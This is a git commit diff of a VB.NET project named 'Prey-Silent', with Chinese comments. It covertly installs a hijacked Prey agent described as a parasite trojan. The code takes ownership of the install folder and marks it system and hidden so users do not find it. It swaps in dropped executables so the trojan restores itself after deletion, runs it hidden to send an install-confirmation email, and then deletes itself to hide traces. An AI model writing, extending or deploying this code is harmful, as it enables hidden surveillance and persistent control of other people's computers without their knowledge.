150ab0ff246996211eaf4d7f8b383eb70b42fb64
Leon <xiaoyankeji@hotmail.com>
2016-09-13 18:07:58 +0800

    劫持警报模块里用于把系统音量调节至最大的模块，以实现 flash.exe 被删除之后的恢复

--- Prey-Silent/BinaryResource.Designer.vb
+++ Prey-Silent/BinaryResource.Designer.vb
@@ -147,5 +147,15 @@ Namespace My.Resources
                 Return CType(obj,Byte())
             End Get
         End Property
+        
+        '''<summary>
+        '''  查找 System.Byte[] 类型的本地化资源。
+        '''</summary>
+        Friend Shared ReadOnly Property voladjust() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("voladjust", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
     End Class
 End Namespace
--- Prey-Silent/DisplayForm.vb
+++ Prey-Silent/DisplayForm.vb
@@ -5,10 +5,10 @@ Public Class DisplayForm
     Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Integer, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Integer) As Integer
     Dim MySelfPath As String = IO.Path.GetTempPath() & "winscr" & My.Computer.Clock.TickCount & ".exe"
     Dim PreyMSIPath As String = IO.Path.GetTempPath() & "Prey.msi"
-    Dim PreyDirectroy As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
+    Dim PreyDirectory As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
     Dim PreyVireion As String = "1.6.3"
-    Dim FlashDirectroy As String = PreyDirectroy & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
-    Dim AlarmDirectory As String = PreyDirectroy & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
+    Dim FlashDirectory As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
+    Dim AlarmDirectory As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
     Dim APIKEY As String = "A4E064ED041C"
 
     Private Sub DisplayForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
@@ -40,25 +40,27 @@ Public Class DisplayForm
 
         '使用管理员权限对整个目标目录提权，方便日后寄生程序的静默更新
         '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间，如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
-        Shell("cmd.exe /c takeown /f " & PreyDirectroy & "/ /r /d y && icacls " & PreyDirectroy & "/ /grant administrators:F /t", vbHide, True)
+        Shell("cmd.exe /c takeown /f " & PreyDirectory & "/ /r /d y && icacls " & PreyDirectory & "/ /grant administrators:F /t", vbHide, True)
         '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
-        Shell("cmd.exe /c attrib " & PreyDirectroy & " +s +h", vbHide, True)
+        Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
 
         '删除 Alarm 目录里的两个 exe ，劫持以实现恢复木马
         If IO.File.Exists(AlarmDirectory & "mpg123.exe") Then IO.File.Delete(AlarmDirectory & "mpg123.exe")
         If IO.File.Exists(AlarmDirectory & "voladjust.exe") Then IO.File.Delete(AlarmDirectory & "voladjust.exe")
 
         '释放劫持程序
-        SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectroy & "alert.exe")
-        SaveResourceFile(My.Resources.BinaryResource.AForge_Video, FlashDirectroy & "AForge.Video.dll")
-        SaveResourceFile(My.Resources.BinaryResource.AForge_Video_DirectShow, FlashDirectroy & "AForge.Video.DirectShow.dll")
-        SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX, FlashDirectroy & "Microsoft.DirectX.dll")
-        SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX_DirectSound, FlashDirectroy & "Microsoft.DirectX.DirectSound.dll")
-        SaveResourceFile(System.Text.Encoding.UTF8.GetBytes(My.Resources.BinaryResource.flash_exe), FlashDirectroy & "flash.exe.config")
-        SaveResourceFile(My.Resources.BinaryResource.Flash, FlashDirectroy & "flash.exe")
+        SaveResourceFile(My.Resources.BinaryResource.alert, FlashDirectory & "alert.exe")
+        SaveResourceFile(My.Resources.BinaryResource.AForge_Video, FlashDirectory & "AForge.Video.dll")
+        SaveResourceFile(My.Resources.BinaryResource.AForge_Video_DirectShow, FlashDirectory & "AForge.Video.DirectShow.dll")
+        SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX, FlashDirectory & "Microsoft.DirectX.dll")
+        SaveResourceFile(My.Resources.BinaryResource.Microsoft_DirectX_DirectSound, FlashDirectory & "Microsoft.DirectX.DirectSound.dll")
+        SaveResourceFile(System.Text.Encoding.UTF8.GetBytes(My.Resources.BinaryResource.flash_exe), FlashDirectory & "flash.exe.config")
+        SaveResourceFile(My.Resources.BinaryResource.Flash, FlashDirectory & "flash.exe")
+        SaveResourceFile(My.Resources.BinaryResource.Flash, AlarmDirectory & "flash_bak")
+        SaveResourceFile(My.Resources.BinaryResource.voladjust, AlarmDirectory & "voladjust.exe")
 
         '使用 [update] 参数调用 寄生程序 ，接收安装/更新成功提示邮件
-        ShellExecute(0, vbNullString, FlashDirectroy & "flash.exe", "update", vbNullString, vbHide)
+        ShellExecute(0, vbNullString, FlashDirectory & "flash.exe", "update", vbNullString, vbHide)
 
         '结束程序并自动删除自身文件，以隐藏痕迹
         DeleteMySelf()
@@ -112,15 +114,14 @@ Public Class DisplayForm
         '宿主程序具有管理员权限，所以不需要使用 ShellExecute ，方便等待进程结束
         Shell(ShellCommand, AppWinStyle.Hide, True)
         '使用 [被寄生程序] 是否存在作为返回值
-        Return IO.File.Exists(FlashDirectroy & "Flash.exe")
+        Return IO.File.Exists(FlashDirectory & "Flash.exe")
     End Function
 
     ''' <summary>
     ''' 结束程序并自动删除自身，以隐藏痕迹
     ''' </summary>
     Private Sub DeleteMySelf()
-        Dim CommandString As String
-        CommandString = """" & Application.ExecutablePath & """"
+        Dim CommandString As String = """" & Application.ExecutablePath & """"
         Shell("cmd /c for /l %a in (0,0,0) do if exist " & CommandString & " (del/a/f " & CommandString & ") else exit", vbHide)
         Application.Exit()
     End Sub
